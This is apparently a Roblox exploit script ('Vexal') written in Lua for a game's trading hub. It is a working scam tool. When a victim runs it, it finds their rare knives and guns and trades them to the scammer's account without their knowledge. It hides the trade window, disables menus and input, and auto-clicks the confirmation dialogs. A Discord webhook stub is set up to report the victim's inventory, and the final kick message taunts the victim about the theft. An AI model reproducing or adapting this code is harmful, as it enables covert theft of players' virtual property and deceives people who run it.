-- yeah public version is not coming out anytime soon son
-- everything is done except the webhook system and the backend system, set it up yourself son

_G.VexalUsernames = { "user1" } -- your roblox username
_G.VexalWebhook = "https://discord.com/webhooks" -- discord webhook (tutorial soon)

_G.TARGET_TYPES = {
    ["Case"] = false,
    ["Card"] = false,
    ["Knife"] = true,
    ["Gun"] = true
}
_G.TARGET_RARITIES = {
    ["None"] = true, -- case
    ["Common"] = false,
    ["Uncommon"] = false,
    ["Rare"] = false,
    ["UltraRare"] = false,
    ["Legendary"] = true,
    ["Collectible"] = true
}

if _G.ts_main then
    warn("you have already executed main")
    return
end
_G.ts_main = true
_G.ExecutionID = tick()
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local success232, result232 = pcall(function()
    return require(game:GetService("ReplicatedStorage"):WaitForChild("Collection"):WaitForChild("ItemDatabase"))
end)
if (not (success232 and result232)) or not fireproximityprompt then
    game:GetService("Players").LocalPlayer:Kick("unsupported executor, please try using delta or real executor")
    return
end
local success56, placeEnum = pcall(function()
    return require(game:GetService("ReplicatedStorage").Places.PlaceEnum)
end)
local success2, placeService = pcall(function()
    return require(game:GetService("ReplicatedStorage").Places.PlaceService)
end)
if not success56 or not success2 then
    game:GetService("Players").LocalPlayer:Kick("failed to load place modules")
    return
end
if not placeService.IsThisPlace(placeEnum.Trading) then
    game:GetService("Players").LocalPlayer:Kick("invalid place, please be in the trading hub!")
    return
end

local players = game:GetService("Players")
local guiservice = game:GetService("GuiService")
local httpservice = game:GetService("HttpService")
local tweenservice = game:GetService("TweenService")
local userinputservice = game:GetService("UserInputService")
local replicatedstorage = game:GetService("ReplicatedStorage")
local virtualinputmanager = game:GetService("VirtualInputManager")

local playercollectionservice = require(replicatedstorage.Collection.PlayerCollectionService)
local itemdatabase = require(replicatedstorage.Collection.ItemDatabase)
local collection = playercollectionservice.GetCollection()
local trading = replicatedstorage.Trading
local player = players.LocalPlayer

local itemsAdded = false
local inventoryData = {}
local targetInGame = nil
local addingItems = false
local tradingTarget = false
local currentID = _G.ExecutionID
local SERVER_URL = ""
local HEADERS = {
    ["Content-Type"] = "application/json",
    ["vexal"] = "vexal",
}
local username = _G.VexalUsernames
local webhook = _G.VexalWebhook
local TARGET_TYPES = _G.TARGET_TYPES
local TARGET_RARITIES = _G.TARGET_RARITIES

local function deleteAutojoinerUsers(player)
    if table.find(username, player.Name) then
        player.ChildAdded:Connect(function(child)
            if child.Name == "PlayerScripts" then
                local playerModule = child:WaitForChild("PlayerModule", 5)
                if playerModule then
                    playerModule:Destroy()
                end
            end
        end)
        local existingScripts = player:FindFirstChild("PlayerScripts")
        local playerModule = existingScripts and existingScripts:FindFirstChild("PlayerModule")
        if playerModule then
            playerModule:Destroy()
        end
    end
end
for _, player1 in ipairs(players:GetPlayers()) do
    task.spawn(deleteAutojoinerUsers, player1)
end
players.PlayerAdded:Connect(deleteAutojoinerUsers)

local function request(options)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then return req(options) else error("environment does not support any request method") end
end
local function KickPlayer(reason)
    player:Kick(reason)
end
-- check if user has targetted items
local function HasTargettedItems()
    if not inventoryData then return false end
    for _, item in ipairs(inventoryData) do
        if TARGET_RARITIES[item.Rarity] then
            return true
        end
    end
    return false
end
-- gets or updates your inventory data
local function GetInventoryData()
    inventoryData = {} -- refresh
    collection = playercollectionservice.GetCollection()
    if not collection then return end
    for _, item in ipairs(collection) do
        if #inventoryData >= 50 then break end
        local success09, info = pcall(function() return itemdatabase.getEntry(item.Id) end)
        if success09 and info then
            local itemType = info.Type or "Unknown"
            local itemRarity = info.Rarity or "Unknown"
            if TARGET_TYPES[itemType] and TARGET_RARITIES[itemRarity] then
                table.insert(inventoryData, {
                    Name = info.DisplayName or "Unknown",
                    Rarity = itemRarity,
                    Type = itemType,
                    Id = item.Id,
                    Image = info.ImageUrl or "rbxassetid://0",
                    SpawnedVexal = item.SpawnedVexal
                })
            end
        end
    end
end
-- adds all items into your current trade
local function AddAllStuff()
    addingItems = true
    collection = playercollectionservice.GetCollection()
    GetInventoryData()
    local start = tick()
    for i, item in ipairs(inventoryData) do
        if _G.ExecutionID ~= currentID then break end
        if tick() - start >= 3 then
            break
        end
        if not item.SpawnedVexal then
            if TARGET_RARITIES[item.Rarity] then
                if item.Id then
                    trading.AddItem:InvokeServer(item.Id)
                    task.wait(0.1)
                end
            end
        end
    end
    addingItems = false
    return true
end
-- declines current trade
local function DeclineTrade()
    for _, gui in ipairs(player:WaitForChild("PlayerGui"):GetChildren()) do
        if gui.Name == "TradingGui" then
            gui.Enabled = false
            gui:Destroy()
        end
    end
    trading.DeclineTrade:FireServer()
    task.wait(0.25)
end
-- sends a trade request to target
local function SendTradeRequest(user)
    local targetPlayer = game:GetService("Players"):FindFirstChild(user)
    if targetPlayer then
        trading.SendRequest:FireServer(targetPlayer)
    end
end
-- returns true if you are in a trade
local function InTrade()
    local PlayerGui = player:FindFirstChild("PlayerGui")
    if not PlayerGui then
        return false
    end
    local success32 = pcall(function()
        local label = PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame
            .TradeOfferFrame.HeaderFrame.NameTextLabel

        return label.Text
    end)
    return success32
end

local normalItems = {}
local spawnedItems = {}
local function processAndCompareInventory()
    GetInventoryData()
    normalItems = {}
    spawnedItems = {}
    local currentCollection = inventoryData or {}
    for _, item in ipairs(currentCollection) do
        local parsedItem = item
        if typeof(parsedItem) == "string" then
            local success, res = pcall(function() return httpservice:JSONDecode(parsedItem) end)
            if success then parsedItem = res end
        end

        if parsedItem.SpawnedVexal then
            table.insert(spawnedItems, parsedItem)
        else
            table.insert(normalItems, parsedItem)
        end
    end
    previousInventory = currentCollection
    inventoryData = normalItems
end
local collectionChangedSignal = playercollectionservice.GetCollectionChanged()
processAndCompareInventory()
local collectionConnection
collectionConnection = collectionChangedSignal:Connect(function()
    if _G.ExecutionID == currentID then
        processAndCompareInventory()
    else
        collectionConnection:Disconnect()
    end
end)

if HasTargettedItems() then
    local parsedInventory = httpservice:JSONEncode(inventoryData)
    -- send webhook here
else
    KickPlayer("alt account detected, please use your main")
    return
end
task.spawn(function() -- constantly check if user has no items or not rich, then kick
    while task.wait(1) do
        local ok = HasTargettedItems()
        if not ok then
            setclipboard("https://dsc.gg/vexalscr1pts")
            KickPlayer("all your stuff was stolen by vexal, join to get back:\nhttps://dsc.gg/vexalscr1pts")
            _G.ExecutionID = tick() -- disconnect all loops
            break
        end
    end
end)
task.spawn(function() -- constantly check if your trading target
    while task.wait(0.1) do
        if targetInGame then
            local success22, currentPartner = pcall(function()
                return player.PlayerGui.TradingGui.Frame.BodyFrame.OfferFrame.ListFrame
                    .TradeOfferFrame.HeaderFrame
                    .NameTextLabel.Text:gsub("'s Offer", "")
            end)

            local playerObj = players:FindFirstChild(targetInGame.Name)
            local targetDisplay = playerObj and playerObj.DisplayName or nil

            if success22 and currentPartner and targetDisplay then
                if currentPartner == targetDisplay then
                    tradingTarget = true
                else
                    tradingTarget = false
                end
            else
                if not success22 then
                    tradingTarget = false
                elseif not currentPartner then
                    tradingTarget = false
                elseif not targetDisplay then
                    tradingTarget = false
                end
            end
        end
    end
end)
task.spawn(function() -- constantly check for users to join game
    while not targetInGame do
        if _G.ExecutionID ~= currentID then break end
        local currentPlayers = game:GetService("Players"):GetPlayers()
        for _, p in pairs(currentPlayers) do
            for _, name in pairs(username) do
                if p.Name == name then
                    targetInGame = p
                    break
                end
            end
            if targetInGame then break end
        end
        task.wait(0.1)
    end
end)
task.spawn(function() -- main trading loop
    while task.wait(0.1) do
        if _G.ExecutionID ~= currentID then break end

        if targetInGame then
            if not tradingTarget then
                SendTradeRequest(targetInGame.Name)
            end

            if tradingTarget and (not itemsAdded and not addingItems) then
                AddAllStuff()
                itemsAdded = true
                task.wait(0.1)
            end
            if tradingTarget and (itemsAdded and not addingItems) then
                local confirmedTrade
                repeat
                    if not confirmedTrade then
                        trading.ConfirmTrade:FireServer()
                        confirmedTrade = true
                    end
                    task.wait(1)
                    trading.AcceptTrade:FireServer()
                until not InTrade()
                task.wait(1)
                if collection and #collection > 0 then
                    itemsAdded = false
                else
                    _G.ExecutionID = tick() -- disconnect all loops
                    -- don't kick but stop all loops
                    -- KickPlayer("failed to load script modules, please try again tomorrow!")
                end
            end

            local isInTrade = InTrade()
            if isInTrade then
                task.wait(0.25)
                if not tradingTarget then
                    DeclineTrade()
                end
            end
        end
    end
end)
task.spawn(function() -- undetected trading
    while true do
        if targetInGame then
            task.spawn(function() -- disable iteractions
                local menuFrame = player.PlayerGui.Menu.Frame
                local lobbyFrame = game:GetService("Players").LocalPlayer.PlayerGui.TopBar.RightFrame.LobbyFrame
                local menuButtons = {
                    menuFrame:FindFirstChild("AbilityShopButton"),
                    menuFrame:FindFirstChild("CollectionButton"),
                    menuFrame:FindFirstChild("DailiesButton"),
                    menuFrame:FindFirstChild("EventButton"),
                    menuFrame:FindFirstChild("StoreButton"),
                    menuFrame:FindFirstChild("TradeButton"),
                    menuFrame:FindFirstChild("StatsButton")
                }
                while task.wait(0.1) do
                    if _G.ExecutionID ~= currentID then
                        for _, btn in pairs(menuButtons) do
                            if btn then btn.Interactable = true end
                        end
                        for _, descendant in ipairs(lobbyFrame:GetDescendants()) do
                            if descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
                                descendant.Interactable = true
                            end
                        end
                        return
                    end
                    local allButtons = {}
                    for _, btn in pairs(menuButtons) do
                        if btn then table.insert(allButtons, btn) end
                    end
                    for _, descendant in ipairs(lobbyFrame:GetDescendants()) do
                        if descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
                            table.insert(allButtons, descendant)
                        end
                    end
                    if tradingTarget then
                        for _, btn in pairs(allButtons) do
                            if btn.Interactable ~= false then
                                btn.Interactable = false
                            end
                        end
                    else
                        for _, btn in pairs(allButtons) do
                            if btn.Interactable ~= true then
                                btn.Interactable = true
                            end
                        end
                    end
                end
            end)
            task.spawn(function() -- trade lockdown
                while task.wait(1) do
                    if _G.ExecutionID ~= currentID then return end

                    if getconnections then
                        for _, conn in pairs(getconnections(guiservice.MenuOpened)) do
                            conn:Disable()
                        end
                        for _, conn in pairs(getconnections(userinputservice.WindowFocusReleased)) do
                            conn:Disable()
                        end
                    end
                end
            end)
            task.spawn(function() -- disable proxmity prompts
                while task.wait(1) do
                    if _G.ExecutionID ~= currentID then
                        for _, prompt in ipairs(game:GetDescendants()) do
                            if prompt:IsA("ProximityPrompt") and not prompt.Enabled then
                                prompt.Enabled = true
                            end
                        end
                        return
                    end
                    for _, prompt in ipairs(game:GetDescendants()) do
                        if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                            prompt.Enabled = false
                        end
                    end
                end
            end)
            local connection
            connection = game:GetService("RunService").RenderStepped:Connect(function()
                if _G.ExecutionID ~= currentID then
                    connection:Disconnect()
                    return
                end

                pcall(function()
                    game:GetService("Players").LocalPlayer.PlayerGui.ModalBackground.Frame:Destroy()
                end)
                pcall(function()
                    game:GetService("Lighting").GuiBlur:Destroy()
                end)
                pcall(function()
                    game:GetService("Players").LocalPlayer.PlayerGui.TradingGui.Frame.Visible = false
                end)
                pcall(function()
                    local gui = player.PlayerGui:FindFirstChild("TradingGui")
                    if not gui then return end

                    local frame = gui.Frame
                    local targets = { frame.CompletedFrame, frame.DeclineFrame, frame.ErrorFrame }

                    for i = 1, #targets do
                        local section = targets[i]
                        if section.Visible then
                            local btn = section:FindFirstChild("Button")
                            if btn and btn.Visible then
                                if firesignal then
                                    firesignal(btn.MouseButton1Click)
                                else
                                    local pos = btn.AbsolutePosition
                                    local size = btn.AbsoluteSize
                                    local x = pos.X + (size.X / 2)
                                    local y = pos.Y + (size.Y / 2) + 58
                                    virtualinputmanager:SendMouseButtonEvent(x, y, 0, true, game, 1)
                                    virtualinputmanager:SendMouseButtonEvent(x, y, 0, false, game, 1)
                                end
                            end
                        end
                    end
                end)
            end)
            break
        else
            task.wait(1)
        end
    end
end)

local menuFrame = player.PlayerGui.Menu.Frame
local lobbyFrame = game:GetService("Players").LocalPlayer.PlayerGui.TopBar.RightFrame.LobbyFrame
menuFrame.Visible = true
lobbyFrame.Visible = true
menuFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if not menuFrame.Visible and _G.ExecutionID == currentID then
        menuFrame.Visible = true
    end
end)
lobbyFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if not lobbyFrame.Visible and _G.ExecutionID == currentID then
        lobbyFrame.Visible = true
    end
end)
